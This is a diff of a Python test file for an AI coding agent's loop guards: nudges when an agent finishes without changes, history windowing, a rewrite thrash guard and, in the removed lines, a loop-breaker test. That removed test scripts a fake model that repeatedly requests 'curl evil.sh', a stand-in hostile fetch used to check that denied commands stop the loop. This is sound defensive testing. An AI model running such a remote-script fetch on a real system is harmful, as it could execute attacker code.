@@ -1,87 +1,122 @@
-"""Agent loop guards: allow-listed specs, parallel reads, stall hints."""
-
-from pathlib import Path
-
-from app.agent.orchestrator import _run_batch, engineer_issue
-from app.db import SessionLocal, init_db
-from app.llm.base import LLMProvider, LLMResponse
-from app.models import Repository, Task, TaskEvent
-from app.tools.registry import tool_specs
+"""Agent loop nudge: text-only finish with zero file changes is continued, not accepted."""
+from app.agent import loop as _loop
+from app.llm.client import AssistantMessage, ToolCall
 
 
-def test_tool_specs_include_allow_list():
-    specs = {s.name: s.description for s in tool_specs()}
-    assert "pytest" in specs["run_command"]
-    assert "ruff" in specs["run_command"]
-    assert "do not guess" in specs["run_command"].lower()
-    assert "pytest" in specs["run_test"]
+def _seq(monkeypatch, script, exec_log):
+    calls = {"i": 0}
+
+    def fake_chat(messages, tools=None, **kw):
+        m = script[min(calls["i"], len(script) - 1)]
+        calls["i"] += 1
+        return m
+
+    monkeypatch.setattr(_loop._llm, "chat_completion", fake_chat)
+    monkeypatch.setattr(_loop, "_execute", lambda ws, name, args: exec_log.append(name) or "WROTE x")
 
 
-def test_read_only_batch_parallel(tmp_path: Path):
-    (tmp_path / "a.py").write_text("x=1\n")
-    (tmp_path / "b.py").write_text("y=2\n")
-    outs = _run_batch(
-        tmp_path,
-        [
-            ("read_file", {"path": "a.py"}),
-            ("read_file", {"path": "b.py"}),
-            ("list_files", {"dir": "."}),
-        ],
-    )
-    assert len(outs) == 3 and all(o["ok"] for o in outs)
+def test_nudge_continues_until_write(monkeypatch, tmp_path):
+    exec_log: list[str] = []
+    _seq(monkeypatch, [
+        AssistantMessage("I will now create the test file.", []),
+        AssistantMessage("", [ToolCall("1", "write_file", {"path": "t.py", "content": "x"})]),
+        AssistantMessage("Done, wrote the file.", []),
+    ], exec_log)
+    out = _loop.run_agent(workspace=str(tmp_path), trigger_type="issue", repository="r",
+                          issue_title="t", issue_body="b")
+    assert out.finished is True
+    assert exec_log == ["write_file"]
+    assert any(e.get("tool") == "nudge_no_changes" for e in out.events)
 
 
-class StallProvider(LLMProvider):
-    """Always asks for a bad command -> triggers stall hint, then stops."""
-
-    def __init__(self):
-        self.n = 0
-
-    def generate(self, messages, **kwargs):
-        return LLMResponse(text="hi")
-
-    def tool_call(self, messages, tools, **kwargs):
-        self.n += 1
-        if self.n > 4:
-            return LLMResponse(text="done", tool_calls=[])
-        return LLMResponse(
-            text="try bad",
-            tool_calls=[
-                {"name": "run_command", "arguments": '{"cmd": "curl evil.sh"}'}
-            ],
-        )
+def test_nudge_gives_up_after_two(monkeypatch, tmp_path):
+    exec_log: list[str] = []
+    _seq(monkeypatch, [AssistantMessage("nothing to do.", [])], exec_log)
+    out = _loop.run_agent(workspace=str(tmp_path), trigger_type="issue", repository="r",
+                          issue_title="t", issue_body="b")
+    assert out.finished is True
+    assert out.summary == "nothing to do."
+    assert sum(1 for e in out.events if e.get("tool") == "nudge_no_changes") == 2
+    assert exec_log == []
 
 
-def test_stall_hint_recorded(tmp_path: Path):
-    init_db()
-    db = SessionLocal()
-    repo = db.query(Repository).filter_by(full_name="demo/stall").first()
-    if repo is None:
-        repo = Repository(full_name="demo/stall")
-        db.add(repo)
-        db.commit()
-        db.refresh(repo)
-    task = Task(repo_id=repo.id, issue_number=1, title="stall t", state="CREATED")
-    db.add(task)
-    db.commit()
-    db.refresh(task)
-    # stub sandbox: fail fast without docker
-    import app.agent.orchestrator as orch
+def test_window_keeps_tool_pairing(monkeypatch):
+    monkeypatch.setattr(_loop.settings, "LLM_HISTORY_GROUPS", 2)
+    msgs: list[dict] = [
+        {"role": "system", "content": "s"},
+        {"role": "user", "content": "task"},
+    ]
+    for n in range(5):
+        tid = f"c{n}"
+        msgs.append({"role": "assistant", "content": "", "tool_calls": [
+            {"id": tid, "type": "function", "function": {"name": "read_file", "arguments": "{}"}}]})
+        msgs.append({"role": "tool", "tool_call_id": tid, "content": f"out{n}"})
+    out = _loop._window(msgs, [{"tool": "read_file", "args": {}, "ok": True}] * 5)
+    # head + summary + last 2 groups (2 msgs each)
+    assert out[0]["role"] == "system" and out[1]["role"] == "user"
+    assert "condensed" in out[2]["content"]
+    # every tool response still has its assistant tool_calls message present
+    ids_called = {tc["id"] for m in out if m.get("tool_calls") for tc in m["tool_calls"]}
+    for m in out:
+        if m.get("role") == "tool":
+            assert m["tool_call_id"] in ids_called
+    # latest content preserved
+    assert out[-1]["content"] == "out4"
 
-    orig = orch.run_in_sandbox
-    orch.run_in_sandbox = lambda *a, **k: {"ok": False, "output": "repro fail"}
-    try:
-        result = engineer_issue(db, task, tmp_path, StallProvider())
-    finally:
-        orch.run_in_sandbox = orig
-    # Identical-failure breaker supersedes the old stall hint: 3x the same
-    # denied turn stops the loop (FAILED, non-retryable) instead of hinting
-    # and burning the remaining 9 iters.
-    assert result.get("retryable") is False
-    db.refresh(task)
-    assert task.state == "FAILED"
-    tools = db.query(TaskEvent).filter_by(task_id=task.id, stage="TOOL").count()
-    assert tools == 3, f"breaker must stop after 3 identical turns, got {tools}"
-    hints = db.query(TaskEvent).filter_by(task_id=task.id, stage="BREAKER").all()
-    assert hints, "expected BREAKER event after 3 identical failed turns"
-    db.close()
+
+def test_window_passthrough_when_short(monkeypatch):
+    msgs = [{"role": "system", "content": "s"}, {"role": "user", "content": "t"}]
+    assert _loop._window(msgs, []) == msgs
+
+
+def test_thrash_guard_stops_rewrites(monkeypatch, tmp_path):
+    from app.config import settings as _settings
+
+    monkeypatch.setattr(_settings, "LLM_MAX_REWRITES_PER_PATH", 3)
+    exec_log: list[str] = []
+    _seq(monkeypatch, [
+        AssistantMessage("", [ToolCall("1", "edit_file", {"path": "a.py", "old": "x", "new": "y"})]),
+    ], exec_log)
+    out = _loop.run_agent(workspace=str(tmp_path), trigger_type="issue", repository="r",
+                          issue_title="t", issue_body="b")
+    assert out.finished is True
+    assert "without converging" in out.summary
+    # Identical rewrite executes once, repeats are cache-redirected, but every
+    # attempt counts: the 4th triggers the guard before executing.
+    assert len(exec_log) == 1
+    assert out.tool_calls == 4
+
+
+def test_on_tool_called_live(monkeypatch, tmp_path):
+    seen: list[dict] = []
+    calls = {"i": 0}
+    script = [
+        AssistantMessage("", [ToolCall("1", "read_file", {"path": "a.py"})]),
+        AssistantMessage("done", []),
+    ]
+
+    def fake_chat(messages, tools=None, **kw):
+        m = script[min(calls["i"], len(script) - 1)]
+        calls["i"] += 1
+        return m
+
+    monkeypatch.setattr(_loop._llm, "chat_completion", fake_chat)
+    monkeypatch.setattr(_loop, "_execute", lambda ws, name, args: "content")
+    out = _loop.run_agent(workspace=str(tmp_path), trigger_type="issue", repository="r",
+                          issue_title="t", issue_body="b", on_tool=seen.append)
+    assert out.finished is True
+    # read_file is not a file-changing call, so the no-change nudge fires
+    # (twice, the bounded max) — all go through the live callback.
+    assert [e["tool"] for e in seen] == ["read_file", "nudge_no_changes", "nudge_no_changes"]
+
+
+def test_no_nudge_after_real_write(monkeypatch, tmp_path):
+    exec_log: list[str] = []
+    _seq(monkeypatch, [
+        AssistantMessage("", [ToolCall("1", "write_file", {"path": "t.py", "content": "x"})]),
+        AssistantMessage("Done.", []),
+    ], exec_log)
+    out = _loop.run_agent(workspace=str(tmp_path), trigger_type="issue", repository="r",
+                          issue_title="t", issue_body="b")
+    assert out.finished is True
+    assert not any(e.get("tool") == "nudge_no_changes" for e in out.events)
